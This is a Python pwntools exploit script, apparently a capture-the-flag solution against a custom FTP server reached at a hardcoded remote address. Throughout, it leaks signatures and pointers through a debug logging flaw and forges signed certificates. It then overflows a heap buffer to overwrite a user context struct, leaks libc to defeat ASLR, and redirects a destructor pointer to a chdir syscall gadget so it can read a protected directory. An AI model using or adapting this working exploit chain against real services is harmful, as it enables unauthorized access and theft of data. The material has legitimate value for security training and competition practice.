from email.mime import base
from http.client import PAYMENT_REQUIRED
from pwn import *
import time
import binascii
import sys
import crypt
import serial

#112 : free(destructorPAsvCon)
#336: free(NewPAsvCon)
#496: free(lookup)
#----------------------PART1 INIT
REMOTE = False


local_pasv = 33344

def rev(v):
    a = b""
    for i in range(0,len(v),2):
        a += v[len(v)-i-2:len(v)-i]

    return a

payload_leak =b"anonanonanonanon"


if REMOTE:
    p = remote("62.210.131.87", 31337)
else:
    p = remote("127.0.0.1" , 31337)

#----------------------PART1 INIT
#----------------------PART2 FIX HEAP SIZE

cert_bad = b"user=anon&perms=2&sig=548484844"
cert_bad = base64.b64encode(cert_bad)

p.sendline(b"CERT " + cert_bad)
time.sleep(0.5)
print(p.recvline())

time.sleep(0.5)

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())
#----------------------PART2 FIX HEAP SIZE
#----------------------PART3 LEAK SIGUSER from anon & anonymous

p.sendline(b"DBG\n")
time.sleep(0.5)


p.sendline(b"USER %s" % payload_leak)


print(p.recvuntil(b"Invalid username\n").decode())

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

print(p.recvuntil(b"successful\n").decode())


p.sendline(b"PASV\n")
time.sleep(0.5)
print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")

time.sleep(0.5)

print(p.recvuntil(b"Send ok").decode())

print(pasv.recvuntil(payload_leak))
print(pasv.recvuntil(payload_leak))

leak = pasv.recvline()
print(leak)
leak = leak.split(b":")[0]
leak = leak[0:len(leak)-1]
leak_hex = binascii.hexlify(leak)
print(f"LEAK = {leak_hex}")
print(f"SIGUSER (anon +1) = {leak_hex[0:16]}")

print(pasv.recvuntil(b"ftp.log"))

pasv.close()

p.sendline("CERT dXNlcj1hbm9ueW1vdXMmcGVybXM9MSZzaWc9JZwSUYC422Y=".encode())

time.sleep(0.5)
print(p.recvuntil(b"Invalid signature\n"))

p.sendline(b"USER anonymous\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anonymous\n")

print(p.recvuntil(b"successful\n").decode())


payload_leak =b"anonymousaaaaaaaaaaaaaaaa"

p.sendline(b"USER %s" % payload_leak)


print(p.recvuntil(b"Invalid username\n").decode())

p.sendline(b"PASS anonymous\n")

print(p.recvuntil(b"successful\n").decode())


p.sendline(b"PASV\n")
print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")


print(p.recvuntil(b"Send ok").decode())

print(pasv.recvuntil(payload_leak))

print(pasv.recvline())


pasv.recvuntil(b"anonymousaaaaaaa")
leak = pasv.recvline()

leak = leak.split(b":")[0]
leak = leak[0:len(leak)-1]
leak_hex_2 = binascii.hexlify(leak)
print(f"LEAK = {leak_hex_2}")
print(f"SIGUSER (anonymous +1) = {leak_hex_2[0:16]}")

L1 = leak_hex[0:16].decode()
L2 = leak_hex_2[0:16].decode()

L1_i = ""
L2_i = ""

for i in range(0,16,2):
    L1_i += L1[16-i-2: 16-i]

for i in range(0,16,2):
    L2_i += L2[16-i-2: 16-i]
    
print("anon LEAK1 / anon LEAK 2 -> ", L1_i, L2_i)

#----------------------PART3 LEAK SIGUSER from anon & anonymous
#----------------------PART4 LEAK LIBC VIA BUFFER OVERFLOW



p.recvline()

if REMOTE:
        
    while True:
        arg = input("Cert>").split(":")
        cert = arg[0].encode()
        k1 = int(arg[1])
        k2 = int(arg[2])
        print(cert, str(k1), str(k2))
        p.sendline(cert)
        a = p.recvline()
        print(a)
        if b"150" in a:
            break
else:
    cert = "CERT dXNlcj1hbm9uYmlnZ2VyJnBlcm1zPTImc2lnPTEyMTc2Mjg4MjcwNTMzMDY5MTYy".encode()
    p.sendline(cert)
    p.recvline()

if REMOTE:
    pass

else:
    k1 = 123
    k2 = 456


print("ptr_ComputeSigUser_Signed = " , leak_hex[16:32])

ptr_full = leak_hex[16:32]
pay = leak_hex[16:28]
print("ptr_sigUser is 0x", pay.decode())

pay = rev(pay)
print("Reversed ptr_sigUser is 0x",pay.decode())

#let's exploit

base_addr_got = binascii.unhexlify(hex(int(pay,16) + 17480+24).replace("0x","").encode())
print("BASE_GOT_ADDR : 0x", binascii.hexlify(base_addr_got).decode())

base_addr_parseCommand = binascii.unhexlify(hex(int(pay,16) - 7632).replace("0x","").encode())
print("BASE_PARSE_ADDRCMD : 0x", binascii.hexlify(base_addr_parseCommand).decode())

base_addr_newftpserver = binascii.unhexlify(hex(int(pay,16) - 8928).replace("0x","").encode())
print("BASE_NEWFTPSERVER : 0x", binascii.hexlify(base_addr_newftpserver).decode())


#bof context_user with context_user->username = GOT_addr
#call parseCommandFtpServer
#will printf libc get_env symbol -> we got aslr 


#cert = "dXNlcj1hbm9uJnBlcm1zPTImc2lnPTE3NDEyMjU0NTQwNTQ1NDYwNzM0=".encode()
cert_original = base64.b64decode(cert)
len_cert= len(cert_original)



#context_user=
#[isLogged 0-8]
#[perms 8-16]
#[char * user 16-24]
#[computedSigUser 24-32]
#[ptr_computeSigUser 32-40]
#[DestructorCert_ptr 40-48]
isLogged = b"\x01" + b"\x00"*7 
perms = b"\x02" + b"\x00"*7
if len(base_addr_got) != 8:
    base_addr_got = b"\x00"*(8-len(base_addr_got)) + base_addr_got
    base_addr_got = binascii.unhexlify(rev(binascii.hexlify(base_addr_got)))

user = base_addr_got
computedSigUser = b"A"*8

def sign(addr):
    r = crypt.sign64(addr, b"\x00"*8, k1,k2)
    print(k1,k2)
    bit8 = int(r[-2:],16)
    bit7 = int(r[-4:-2],16)

    bit8_input = int(binascii.hexlify(addr)[-2:],16)
    bit7_input = int(binascii.hexlify(addr)[-4:-2],16)
    a1 = hex(bit7 | bit7_input).replace("0x","").encode()
    a2 = hex(bit8 | bit8_input).replace("0x","").encode()
    if len(a1) != 2:
        a1 = b"0" + a1
    if len(a2) != 2:
        a2 = b"0" + a2
    signedbase = binascii.hexlify(addr)[0:12] + a1 +a2
    return binascii.unhexlify(signedbase)



ptr_computeSigUser = binascii.unhexlify(ptr_full)
print(ptr_computeSigUser)

if len(base_addr_newftpserver) != 8:
    base_addr_newftpserver = b"\x00"*(8-len(base_addr_newftpserver)) + base_addr_newftpserver
    base_addr_newftpserver = binascii.unhexlify(rev(binascii.hexlify(base_addr_newftpserver)))

Destructor_ptr =sign(base_addr_newftpserver)

payload = isLogged + perms + user + computedSigUser + ptr_computeSigUser + binascii.unhexlify(ptr_full)

print(payload, len(payload))

bg = b"A"*512 + b"B"*16 + payload

pfinal = b"CERT " +base64.b64encode(bg)


p.sendline(pfinal)
time.sleep(0.5)
print(p.recvline())


p.sendline(b"wowowo")
time.sleep(0.5)
print(p.recvline())

p.sendline(b"B"*1028)
time.sleep(0.5)
print(p.recvline())
print(p.recvline())

cert_bad = b"user=anon&perms=2&sig=548484844"
cert_bad = base64.b64encode(cert_bad)

p.sendline(b"CERT " + cert_bad)
time.sleep(0.5)
print(p.recvline())

p.sendline(b"USER anon\n")
time.sleep(0.5)

print(p.recvuntil(b"need password\n").decode())
p.sendline(b"PASS anon\n")
time.sleep(0.5)

p.sendline(b"PASV\n")

print(p.recvuntil(b"passive mode").decode())

passive_param = p.recvline().decode().strip().replace("(","").replace(")","").split(",")
p1 = int(passive_param[-2])
p2 = int(passive_param[-1])
if REMOTE:
    pasv = remote("62.210.131.87", (p1*256)+p2)
else:
    pasv = remote("127.0.0.1", 33344)

p.sendline(b"RETR ftp.log")
print(p.recvuntil(b"Send ok").decode())

pasv.recvuntil(b"Invalid cert")
pasv.recvline()
leak_libc = rev(binascii.hexlify(pasv.recvline().split(b" : ")[0].split(b"User ")[1]))

#now let's rop

libc = ELF('/home/thibault/sstic/release/tmp_mnt/lib/x86_64-linux-gnu/libc.so.6')

base_libc = int(leak_libc,16) - libc.symbols['getenv'] -4 #leak libc base for aslr
print("got base libc address : ", hex(base_libc))

#----------------------PART5 CAT M00N.TXT via chdir syscall via Buffer overflow into /sensitive then PASV/RETR 

syscall_chdir = 0x10ea44 #mov eax , 0x50 ; syscall (chdir)
senstive_directory = b"73656e7369746976652f" 


Destructor_ptr = base_libc + syscall_chdir
hi2 = "{0:0{1}x}".format(Destructor_ptr,16).encode()

print("libc chdir: ", hi2)
Destructor_ptr = rev(hi2)
print("libc chdir_reversed: ", Destructor_ptr)
Destructor_ptr = sign(binascii.unhexlify(Destructor_ptr))
print("libc chdir signed : ", binascii.hexlify(Destructor_ptr).decode())

ptr_computeSigUser = Destructor_ptr

#rdi = ptr to /sensitive -> syscall chdir -> rdi point to /sensitive
payload = binascii.unhexlify(senstive_directory) + b"\x00" +  b"\x41"*5 + user + computedSigUser + ptr_computeSigUser + Destructor_ptr
print(len(payload), payload)
bg = b"A"*512 + b"B"*16 + payload
pfinal = b"CERT " +base64.b64encode(bg)
print(pfinal)
print(p.recvline())

p.sendline(pfinal)
time.sleep(0.5)
print(p.recvline())


p.sendline(b"PWD\n")
print(p.recvline())

p.interactive()
